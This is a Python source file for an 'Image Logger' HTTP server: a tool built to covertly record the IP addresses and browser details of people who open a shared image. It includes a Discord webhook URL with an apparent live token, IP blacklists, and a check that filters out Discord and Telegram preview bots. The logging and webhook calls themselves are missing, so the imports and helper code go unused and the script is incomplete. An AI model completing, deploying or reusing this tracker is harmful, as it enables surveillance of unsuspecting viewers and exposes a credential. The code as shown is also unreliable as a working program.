from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import os, traceback, requests, base64, httpagentparser, cgi

USER_IP = "YOUR_IP_HERE"  # Replace with your actual IP
UPLOAD_DIR = "uploads"  # Directory to store uploaded images
os.makedirs(UPLOAD_DIR, exist_ok=True)

config = {
    "webhook": "https://discord.com/api/webhooks/1334707819806593195/O-mC3lGqk2H9zis2ourQ707uYXjed-MF5l7qcHaLGwK66lFUFgoSnusLpZVCN9VhkCaN",
    "image": None,  # Image will be set dynamically
    "username": "Image Logger",
    "color": 0x00FFFF,
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

class LogAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        client_ip = self.client_address[0]
        if client_ip == USER_IP:
            self.show_upload_gui()
        else:
            self.serve_image()
    
    def show_upload_gui(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"""
        <html><body>
        <h2>Upload an Image</h2>
        <form action="/upload" method="post" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <input type="submit" value="Upload">
        </form>
        </body></html>
        """)
    
    def serve_image(self):
        image_path = config["image"] or "default.jpg"  # Default image if none uploaded
        with open(image_path, "rb") as img:
            self.send_response(200)
            self.send_header("Content-type", "image/jpeg")
            self.end_headers()
            self.wfile.write(img.read())
    
    def do_POST(self):
        if self.path == "/upload":
            content_type, pdict = cgi.parse_header(self.headers["Content-Type"])
            if content_type == "multipart/form-data":
                pdict["boundary"] = bytes(pdict["boundary"], "utf-8")
                form_data = cgi.parse_multipart(self.rfile, pdict)
                file_data = form_data["file"][0]
                file_path = os.path.join(UPLOAD_DIR, "uploaded.jpg")
                with open(file_path, "wb") as f:
                    f.write(file_data)
                config["image"] = file_path  # Update config with new image
            
            self.send_response(303)
            self.send_header("Location", "/")
            self.end_headers()
    
    do_GET = handleRequest

server = HTTPServer(("", 8080), LogAPI)
print("Server started on port 8080")
server.serve_forever()
